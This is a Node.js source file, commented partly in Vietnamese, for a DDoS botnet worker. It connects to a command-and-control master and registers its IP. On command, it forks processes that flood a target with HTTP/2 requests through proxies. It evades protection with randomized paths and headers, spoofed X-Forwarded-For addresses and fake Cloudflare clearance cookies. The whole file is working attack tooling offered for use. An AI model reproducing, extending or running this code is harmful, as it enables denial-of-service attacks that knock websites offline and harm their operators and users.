process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});

const io = require('socket.io-client');
const cluster = require('cluster');
const crypto = require('crypto');
const http2 = require('http2');
const net = require('net');
const tls = require('tls');
const url = require('url');
const fs = require('fs');
const os = require('os');

// ==================== CONFIG ====================
const MASTER_IP = process.argv[2];
const MASTER_PORT = 443;

if (!MASTER_IP) {
    console.error('[!] Usage: node worker.js <master_ip>');
    console.error('[!] Example: node worker.js 123.45.67.89');
    process.exit(1);
}

// ==================== LẤY IP THẬT ====================
function getLocalIP() {
    const nets = os.networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
    }
    }
    return 'unknown';
}

// ==================== TẢI PROXY ====================
let proxies = ['direct'];
try {
    if (fs.existsSync('./proxy.txt')) {
        proxies = fs.readFileSync('./proxy.txt', 'utf-8')
            .split('\n')
            .filter(line => line.trim() && line.includes(':'));
        console.log(`[+] Loaded ${proxies.length} proxies`);
    } else {
        console.log('[!] No proxy.txt found, using direct connection');
    }
} catch (e) {
    console.log('[!] Error loading proxies');
}

// ==================== TLS CONFIG ====================
const ciphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256'
].join(':');

const secureContext = tls.createSecureContext({
    ciphers: ciphers,
    honorCipherOrder: true,
    minVersion: 'TLSv1.2'
});

// ==================== RANDOM HELPERS ====================
function randomElement(arr) { 
    return arr[Math.floor(Math.random() * arr.length)]; 
}

function randomString(len) { 
    return crypto.randomBytes(len).toString('hex').slice(0, len); 
}

function randomIP() { 
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`; 
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ==================== USER-AGENTS ====================
const uap = [
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_4) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_3) AppleWebKit/537.36 Chrome/149.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/150.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 20_0 like Mac OS X) AppleWebKit/605.1.15 Version/20.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 15; SM-S938B) AppleWebKit/537.36 Chrome/150.0.0.0 Mobile Safari/537.36'
];

// ==================== HEADER LISTS ====================
const acceptHeaders = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    '*/*',
    'application/json, text/plain, */*'
];

const encodingHeaders = [
    'gzip, deflate, br',
    'gzip, deflate'
];

const langHeaders = [
    'en-US,en;q=0.9',
    'vi-VN,vi;q=0.9,en-US;q=0.8',
    'fr-FR,fr;q=0.9,en;q=0.8'
];

const cacheHeaders = [
    'no-cache',
    'max-age=0'
];

// ==================== CLASS NetSocket ====================
class NetSocket {
    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        
        const connection = net.connect(options.port, options.host, () => {
            connection.write(buffer);
        });

        connection.setTimeout(5000);
        connection.setKeepAlive(true, 30000);
        connection.setNoDelay(true);

        connection.on('data', (chunk) => {
            const response = chunk.toString();
            if (response.includes('HTTP/1.1 200')) {
                callback(connection);
            } else {
                connection.destroy();
                callback(null);
            }
        });

        connection.on('timeout', () => {
            connection.destroy();
            callback(null);
        });

        connection.on('error', () => {
            connection.destroy();
            callback(null);
        });
    }
}

// ==================== WORKER FLOOD ====================
function createWorker(target, rate) {
    const parsed = url.parse(target);
    const Socker = new NetSocket();
    let requestCount = 0;
    let isRunning = true;
    
    // Gửi stats mỗi giây
    const statsInterval = setInterval(() => {
        if (requestCount > 0 && isRunning) {
            socket.emit('stats', { count: requestCount });
            requestCount = 0;
        }
    }, 1000);
    
    async function flood() {
        if (!isRunning) return;
        
        const proxy = randomElement(proxies);
        if (proxy === 'direct') {
            setTimeout(flood, 100);
            return;
        }
        
        const [proxyHost, proxyPort] = proxy.split(':');
        if (!proxyHost || !proxyPort) {
            setTimeout(flood, 100);
            return;
        }
        
        // Tạo headers đa dạng
        const headers = {
            ':method': 'GET',
            ':path': parsed.path + '?' + randomString(randomInt(4, 12)),
            ':authority': parsed.host,
            'user-agent': randomElement(uap),
            'accept': randomElement(acceptHeaders),
            'accept-encoding': randomElement(encodingHeaders),
            'accept-language': randomElement(langHeaders),
            'cache-control': randomElement(cacheHeaders),
            'referer': 'https://www.google.com/',
            'x-forwarded-for': randomIP(),
            'x-real-ip': randomIP(),
            'cookie': `cf_clearance=${randomString(40)}; session=${randomString(16)}`
        };

        Socker.HTTP({
            host: proxyHost,
            port: parseInt(proxyPort),
            address: parsed.host + ':443'
        }, (connection) => {
            if (!connection || !isRunning) return;

            const tlsConn = tls.connect({
                socket: connection,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: parsed.host,
                rejectUnauthorized: false,
                secureContext: secureContext
            });

            const client = http2.connect(parsed.href, {
                createConnection: () => tlsConn,
                settings: {
                    maxConcurrentStreams: 2000,
                    initialWindowSize: 6291456
                }
            });

            client.on('connect', () => {
                // Gửi batch request
                for (let i = 0; i < rate; i++) {
                    if (!isRunning) break;
                    try {
                        const req = client.request(headers);
                        req.on('error', () => {});
                        req.end();
                        requestCount++;
                    } catch (e) {}
                }
                
                // Đóng kết nối sau khi gửi
                setTimeout(() => {
                    try { client.close(); } catch (e) {}
                    try { connection.destroy(); } catch (e) {}
                }, 100);
            });

            client.on('error', () => {
                try { client.destroy(); } catch (e) {}
                try { connection.destroy(); } catch (e) {}
            });
        });
        
        // Tiếp tục vòng lặp
        setImmediate(flood);
    }
    
    flood();
    
    // Trả về hàm dọn dẹp
    return () => {
        isRunning = false;
        clearInterval(statsInterval);
    };
}

// ==================== KẾT NỐI TỚI MASTER ====================
const masterUrl = `https://${MASTER_IP}`; // Bỏ port, dùng HTTPS
console.log(`[+] Connecting to master at ${masterUrl}`);

const socket = io(masterUrl, {
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    timeout: 10000,
    transports: ['websocket', 'polling']
});

socket.on('connect', () => {
    console.log(`[+] Connected to master at ${MASTER_IP}:${MASTER_PORT}`);
    socket.emit('register', { ip: getLocalIP() });
});

socket.on('attack', (data) => {
    console.log(`\n[+] ATTACK COMMAND RECEIVED`);
    console.log(`   Target: ${data.target}`);
    console.log(`   Time: ${data.time}s`);
    console.log(`   Rate: ${data.rate}`);
    console.log(`   Threads: ${data.threads}`);
    
    // Fork workers theo số threads yêu cầu
    if (cluster.isMaster) {
        console.log(`[+] Forking ${data.threads} workers...`);
        
        for (let i = 0; i < data.threads; i++) {
            cluster.fork();
        }
        
        // Tự động thoát sau thời gian
        setTimeout(() => {
            console.log(`[+] Attack time finished, exiting...`);
            process.exit(0);
        }, data.time * 1000);
        
    } else {
        // Worker process thực hiện flood
        const cleanup = createWorker(data.target, data.rate);
        
        // Lưu cleanup function để dùng khi nhận lệnh stop
        process.on('message', (msg) => {
            if (msg === 'stop') {
                cleanup();
                process.exit(0);
            }
        });
    }
});

socket.on('stop', () => {
    console.log(`[+] STOP command received`);
    
    if (cluster.isMaster) {
        // Gửi lệnh stop cho tất cả worker
        for (const id in cluster.workers) {
            cluster.workers[id].send('stop');
        }
        
        setTimeout(() => {
            process.exit(0);
        }, 1000);
    }
});

socket.on('disconnect', () => {
    console.log(`[-] Disconnected from master`);
    process.exit(0);
});

socket.on('connect_error', (err) => {
    console.log(`[-] Connection error: ${err.message}`);
    console.log(`[!] Make sure master is running at ${masterUrl}`);
});
